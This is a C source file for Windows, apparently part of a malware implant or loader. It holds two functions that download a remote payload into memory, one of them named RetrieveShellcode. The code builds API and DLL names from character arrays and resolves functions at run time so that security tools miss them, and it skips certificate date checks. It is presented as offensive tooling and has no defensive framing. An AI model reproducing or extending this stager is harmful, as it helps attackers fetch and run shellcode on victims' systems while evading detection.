#include <windows.h>
#include <wininet.h>
#include <winhttp.h>

BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
	HMODULE hWnet = LoadLibraryW(L"wininet.dll");


	BOOL		bSTATE        = TRUE;

	HINTERNET	hInternet     = NULL,
		        hInternetFile = NULL;

	DWORD		dwBytesRead   = NULL;

	SIZE_T	   	sSize         = NULL;
	PBYTE		pBytes        = NULL,
		        pTmpBytes     = NULL;


	hInternet = InternetOpenA(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		MemCopy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		MemSet(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

#include <windows.h>
#include <winhttp.h>

#include <transport.h>
#include <common.h>
#include <win32.h>

BOOL RetrieveShellcode( 
    _In_     LPCWSTR   Host,
    _In_     INT       Port,
    _In_     LPCWSTR   Path,
    _In_     LPCWSTR   MethodReq,
    _In_opt_ LPCWSTR   UserAgent,
    _In_opt_ LPCWSTR   HeadersAdds,
    _Out_    PBYTE     *pBufferRet,
    _Out_    ULONG_PTR *BufferSzRet
) 
{
    /*=========================[ Dynamic Resolve Functions ]=========================*/

    WCHAR wK32[]     = { L'K', L'E', L'R', L'N', L'E', L'L', L'3', L'2', L'.', L'D', L'L', L'L', 0 };
    WCHAR wWinHttp[] = { L'W', L'i', L'n', L'H', L't', L't', L'p', L'.', L'd', L'l', L'l', 0 };
    char  cWinHttp[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', '.', 'd', 'l', 'l', 0 };

    PVOID pWinHttp;

    char cWinHttpOpen[]             = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    char cWinHttpConnect[]          = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    char cWinHttpOpenRequest[]      = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    char cWinHttpReceiveResponse[]  = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    char cWinHttpSendRequest[]      = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    char cWinHttpReadData[]         = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    char cWinHttpSetOption[]        = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', 0 };
    char cWinHttpCloseHandle[]      = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    
    char cLocalAlloc[]   = { 'L', 'o', 'c', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    char cLocalReAlloc[] = { 'L', 'o', 'c', 'a', 'l', 'R', 'e', 'A', 'l', 'l', 'o', 'c', 0 };
    char cLocalFree[]    = { 'L', 'o', 'c', 'a', 'l', 'F', 'r', 'e', 'e', 0 };

    PVOID k32 = LdrModuleAddr( wK32 );

    pWinHttp = LdrModuleAddr( wWinHttp );

    if ( !pWinHttp )
    {
        pWinHttp = LdrLib( cWinHttp );
    }

    fnWinHttpOpen             pWinHttpOpen              = LdrFuncAddr( pWinHttp, cWinHttpOpen );
    fnWinHttpConnect          pWinHttpConnect           = LdrFuncAddr( pWinHttp, cWinHttpConnect );
    fnWinHttpOpenRequest      pWinHttpOpenRequest       = LdrFuncAddr( pWinHttp, cWinHttpOpenRequest );
    fnWinHttpReceiveResponse  pWinHttpReceiveResponse   = LdrFuncAddr( pWinHttp, cWinHttpReceiveResponse );
    fnWinHttpSendRequest      pWinHttpSendRequest       = LdrFuncAddr( pWinHttp, cWinHttpSendRequest );
    fnWinHttpReadData         pWinHttpReadData          = LdrFuncAddr( pWinHttp, cWinHttpReadData );
    fnWinHttpSetOption        pWinHttpSetOption         = LdrFuncAddr( pWinHttp, cWinHttpSetOption );
    fnWinHttpCloseHandle      pWinHttpCloseHandle       = LdrFuncAddr( pWinHttp, cWinHttpCloseHandle );

    fnLocalAlloc    pLocalAlloc   = LdrFuncAddr( k32, cLocalAlloc );
    fnLocalReAlloc  pLocalReAlloc = LdrFuncAddr( k32, cLocalReAlloc );
    fnLocalFree     pLocalFree    = LdrFuncAddr( k32, cLocalFree );

    /*=========================[ Request Winhttp ]=========================*/

    HINTERNET hSession = NULL, 
              hConnect = NULL, 
              hRequest = NULL;

    PBYTE   pBuffer    = NULL;
    ULONG64 BuffSize   = 0;
    DWORD   BytesRead  = 0;
    PBYTE   pTemp      = DEREF_8( pLocalAlloc(LPTR, 1024) );

    BOOL bResult = FALSE;  

    hSession = pWinHttpOpen( UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( !hSession ) goto _CLEANUP;

    hConnect = pWinHttpConnect( hSession, Host, Port, 0 );
    if ( !hConnect ) goto _CLEANUP;

    hRequest = pWinHttpOpenRequest( hConnect, MethodReq, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0 );
    if ( !hRequest ) goto _CLEANUP;

    if ( !HeadersAdds ) {
        HeadersAdds = WINHTTP_NO_ADDITIONAL_HEADERS;
    }

    bResult = pWinHttpSendRequest( hRequest, HeadersAdds, -1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );
    if ( !bResult ) goto _CLEANUP;

    bResult = pWinHttpReceiveResponse( hRequest, NULL );
    if ( !bResult ) goto _CLEANUP;

    if ( !pTemp ) {
        bResult = FALSE;
        goto _CLEANUP;
    }

    while(TRUE)
    {
        bResult = pWinHttpReadData( hRequest, pTemp, 1024, &BytesRead );
        if ( !bResult ) {
            pLocalFree( pTemp );
            goto _CLEANUP;
        }

        BuffSize += BytesRead;

        if ( pBuffer == NULL )
            pBuffer = DEREF_8( pLocalAlloc(LPTR, BytesRead) );
        else
            pBuffer = DEREF_8( pLocalReAlloc(pBuffer, BuffSize, LMEM_MOVEABLE | LMEM_ZEROINIT) );

        if ( pBuffer == NULL ) {
            bResult = FALSE; 
            pLocalFree(pTemp);
            goto _CLEANUP;
        }

        MemCopy( C_PTR( ( pBuffer + (BuffSize - BytesRead) ) ), pTemp, BytesRead ) ;
        MemSet(pTemp, '\0', BytesRead);

        if (BytesRead < 1024)
            break;

    } 

    *pBufferRet  = pBuffer;
    *BufferSzRet = BuffSize;

    pLocalFree(pTemp);

    bResult = TRUE;

_CLEANUP:
    if (hRequest) pWinHttpCloseHandle(hRequest);
    if (hConnect) pWinHttpCloseHandle(hConnect);
    if (hSession) pWinHttpCloseHandle(hSession);

    return bResult;
}

